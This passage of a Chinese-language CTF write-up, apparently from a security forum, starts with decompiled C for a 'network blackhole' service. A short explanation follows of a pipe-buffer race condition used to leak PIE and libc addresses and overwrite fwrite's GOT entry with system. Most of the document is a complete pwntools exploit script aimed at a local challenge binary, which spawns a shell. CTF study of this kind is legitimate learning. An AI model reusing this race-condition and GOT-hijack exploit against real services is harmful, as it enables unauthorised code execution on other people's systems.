  int index; // [rsp+10h] [rbp-27168h]
  int j; // [rsp+14h] [rbp-27164h]
  int i; // [rsp+18h] [rbp-27160h]
  int read_bytes; // [rsp+1Ch] [rbp-2715Ch]
  struct message *fill_message; // [rsp+20h] [rbp-27158h]
  char name[64]; // [rsp+28h] [rbp-27150h] BYREF
  char destroy_buf[272]; // [rsp+68h] [rbp-27110h] BYREF
  char v10; // [rsp+178h] [rbp-27000h] BYREF
  __int64 v11[512]; // [rsp+26178h] [rbp-1000h] BYREF

  while ( v11 != (__int64 *)&v10 )
    ;
  v11[511] = __readfsqword(0x28u);
  index = 0;
  dprintf(client_fd, "Welcome to the network blackhole! What do you want to destroy?\n");
  do
  {
    read_bytes = read(client_fd, &destroy_buf[index], 0x27100 - index);
    for ( i = 0; i < read_bytes && destroy_buf[index + i] != '\n'; ++i )
      ;
    index += i;
  }
  while ( i >= read_bytes );
  destroy_buf[index] = 0;
  dprintf(client_fd, "Please leave also your name for recording purposes!\n");
  read(client_fd, name, 0x40uLL);
  for ( j = 0; j <= 63 && name[j] != '\n'; ++j )
    ;
  name[j] = 0;
  fill_message = create_fill_message(name, destroy_buf, index);
  v2 = rand();
  usleep(1000 * (v2 % 10 + 1));
  send_message(fill_message, pipe_write);
  dprintf(client_fd, "Data sent to the blackhole, bye!\n");
  destroy_packet(fill_message);
  close(client_fd);
  exit(0);
}
```

思路
==

- 多个进程同时写管道的内容大于pipebuffer，使得一次接受管道流程中断，没接收完
- 然后此时唤醒另一个进程写管道，导致剩余接受的数据来自另一个进程写管道的数据，然后下一轮接受的内容就是就是自己构造的写的内容。但剩余那坨原来的可能会在后面的接受扰乱pipe过程。但问题不大，不会让程序crash。我们只有有一次成功就行了

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-e42a0343b32a1f07b48307c3e7e19c55e30a3681.png)

达到同时写管道：通过信号量。先发送过去，然后信号量机制同时开始写

泄露pie：通过残留的next为NULL\_MESSAGE变量，而该变量存储着一个pie地址，可以通过printf\_message泄露

泄露libc:拿到pie了，我们依然可以通过上述管道竞争使得接受到的message是destory\_buffer构造的。然后此时message所有字段我们都可以控制，此时我们可以控制next为got表附近，使得next的next部分位于got表，然后可以泄露libc。写的时候需要指定index，我们可以先构造command\_flush的command结构体来清空index。然后再发送message然后才是指command\_redact。 注意保证next对应的next的next要为空

劫持程序流：直接写got表为system，构造next，使得对应的next的destory\_buf部分为got表，然后redact\_message修改为system函数`fwrite(message->destory_buf, 1uLL, (int)message->destroy_buf_len, devnull);`这里改fwrite,然后message-&gt;destory\_buf里设置为/bin/sh就好，最后handle\_message触发fwrite

exp
===

```python
from pwn import *
import threading
# Raw intereraction with challenge frontend
PIPE_BUF=65536
def send_message(message, author, sync: threading.Semaphore):
    try:
        r = remote("127.0.0.1", SERVICE_PORT)
        r.sendline(message)
        r.send(author)
        sync.acquire()
        r.send(b"\n")
        r.close()
    except:
        pass

# Helper function to inject a payload using the race condition
def send_stage(payload: dict):
    sync = threading.Semaphore()

    payload_raw = flat(payload)

    #payload = b""
    payload_raw += cyclic(PIPE_BUF-len(payload_raw))
    print("Starting threads...")
    for i in range(30):
        x = threading.Thread(target=send_message, args=(payload_raw,str(i).encode()*63, sync))
        x.start()

    print("Waiting for data to be sent")
    time.sleep(5)
    print("Triggering race condition!")
    sync.release(30)

### Helper functions to create C structs defined in challenge code
def build_message(message, author, next):
    return flat({
        0: 0,
        4: len(message),
        8: p64(next),
        16: author,
        16+64: message
    }, word_size=32)

def build_command(instruction, parm1 = 0, parm2 = 0):
    return flat({
        0: 1,
        4: instruction,
        8: p64(parm1),
        16: p64(parm2)
    }, word_size=32)

### Shortcuts for commands
def command_flush():
    return build_command(0xDEADC0DE)

def command_print():
    return build_command(0xdeadbeef)

def command_redact(id, data):
    return build_command(0xcafebabe, id, data)

def leak_text(r: pwnlib.tubes.tube.tube):
    payload = {
        0: command_print(),
    }
    send_stage(payload)
    while True:
        null_element_address = int(r.recvline_contains(b"Next is ").strip().split(b"Next is ")[1], 0)
        print(f"Leaked {hex(null_element_address)}")

        test_address = null_element_address-exe.symbols["NUL"]

        # This is an hacky way to identify the correct address from the various leaks.
        if test_address % 4096 == 0:
            exe.address = test_address
            break

    print(f"Text base address = {hex(exe.address)}")
    sleep(1)

# Payload to perform arbitrary write
def write_payload(addr, data):
    return command_flush() + build_message(b"CUT-HERE-FOR-WRITE", b"CUT-HERE-FOR-WRITE\0", addr-0x80+6*8) + command_redact(1, data)
def read_payload():
    return command_print()

def leak_libc(r: pwnlib.tubes.tube.tube):
    # Before printing, we are gonna write 0x0 right before the address to be leaked
    # So that mex->next is NULL
    payload = {
        0: write_payload(exe.got.fwrite-0x8, 0x0) + read_payload(),
    }
    send_stage(payload)

    # Discard useless prints
    r.recvline_contains(b"'CUT-HERE-FOR-LIBC-LEAK' by CUT-HERE-FOR-LIBC-LEAK. Next is ")

    # Read leaked address
    leaked_address = u64(r.recvline().strip().split(b"'' by ")[1].split(b".")[0]+b'\x00\x00')
    print(f"libc.sym.fwrite = {hex(leaked_address)}")
    libc.address = leaked_address - libc.sym.fwrite
    print(f"Libc base address = {hex(libc.address)}")
    sleep(1)

def rewrite_got(r: pwnlib.tubes.tube.tube):
    payload = {
        0: write_payload(exe.got.fwrite, libc.sym.system) + build_message(b"/bin/sh", b"Master pwner", 0x0),
    }

    send_stage(payload)

exe=ELF("./chal")
libc=ELF("./libc.so.6")

p=process("./chal")
p.recvuntil(b"Port is ")
SERVICE_PORT=int(p.recvuntil(b"\n",drop=True))
print("remote port "+str(SERVICE_PORT))
leak_text(p)
leak_libc(p)
rewrite_got(p)
p.close()

```